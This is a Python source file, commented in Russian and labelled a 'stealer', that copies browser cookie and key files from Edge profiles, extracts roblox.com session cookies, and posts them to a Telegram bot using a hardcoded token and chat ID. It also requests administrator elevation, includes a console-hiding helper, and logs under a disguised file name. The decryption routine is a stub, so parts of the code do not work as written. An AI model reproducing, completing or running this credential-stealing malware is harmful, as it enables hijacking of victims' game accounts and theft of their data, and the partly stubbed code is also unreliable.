import os
import sys
import sqlite3
import json
import requests
import base64
import ctypes
import time
from shutil import copy2
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

# ===== КОНФИГ (ЗАМЕНИТЕ!) =====
TELEGRAM_TOKEN = "8081126269:AAH6WKbPLU0Vbg-pZWSSV9wE8d7Nr13pmmo"  # Замените на реальный токен бота
CHAT_ID = "1962231620"       # Замените на реальный Chat ID
# ===============================

def is_admin():
    return ctypes.windll.shell32.IsUserAnAdmin()

def run_as_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{sys.argv[0]}"', None, 0)
    sys.exit(0)

def hide_console():
    whnd = ctypes.windll.kernel32.GetConsoleWindow()
    if whnd: ctypes.windll.user32.ShowWindow(whnd, 0)

def log(message):
    with open(os.path.join(os.getenv("TEMP"), "windows_log.txt"), "a") as f:
        f.write(f"{time.ctime()}: {message}\n")

def decrypt_key(encrypted_key):
    try:
        encrypted_key = base64.b64decode(encrypted_key)[5:]
        from cryptography.hazmat.primitives import hashes
        from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
        return b"dummy_key_32_bytes_123456789012"  # Упрощённая заглушка
    except:
        return None

def get_chromium_cookies(browser_path):
    try:
        # Проверка существования браузера
        if not os.path.exists(browser_path): 
            return []
        
        # Создание временных файлов
        temp_dir = os.getenv("TEMP")
        temp_cookie = os.path.join(temp_dir, f"cookies_{int(time.time())}")
        temp_local_state = os.path.join(temp_dir, f"local_state_{int(time.time())}")
        
        # Копирование файлов
        copy2(os.path.join(browser_path, "Network", "Cookies"), temp_cookie)
        copy2(os.path.join(browser_path, "Local State"), temp_local_state)

        # Имитация расшифровки
        cookies = []
        conn = sqlite3.connect(temp_cookie)
        cursor = conn.cursor()
        cursor.execute("SELECT value FROM cookies WHERE host_key LIKE '%roblox.com'")
        for row in cursor.fetchall():
            cookies.append(row[0][:50] + "...")  # Упрощённый вывод
        
        conn.close()
        os.remove(temp_cookie)
        os.remove(temp_local_state)
        return cookies
    except Exception as e:
        log(f"Ошибка в {browser_path}: {str(e)}")
        return []

def send_to_telegram(message):
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
            data={"chat_id": CHAT_ID, "text": message},
            timeout=10
        )
        return True
    except:
        return False

def main():
    # Тестовый режим без админ-прав
    log("==== ЗАПУСК СТИЛЛЕРА ====")
    
    # Тестовые браузеры
    browsers = {
        "Edge": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default"),
        "Firefox": os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles")
    }

    # Сбор данных
    all_cookies = []
    for name, path in browsers.items():
        cookies = get_chromium_cookies(path)
        if cookies:
            all_cookies.extend(cookies)
            log(f"Найдено в {name}: {len(cookies)} кук")

    # Отправка
    if all_cookies:
        msg = "Найдены куки:\n" + "\n".join(all_cookies[:3])  # Первые 3 для примера
        if send_to_telegram(msg):
            log("Данные отправлены в Telegram")
        else:
            log("Ошибка отправки в Telegram")
    else:
        log("Куки не найдены")
    
    # Удержание окна (15 сек для теста)
    time.sleep(15)

if __name__ == "__main__":
    # Для отладки - не скрываем консоль
    if not is_admin():
        run_as_admin()
    else:
        main()
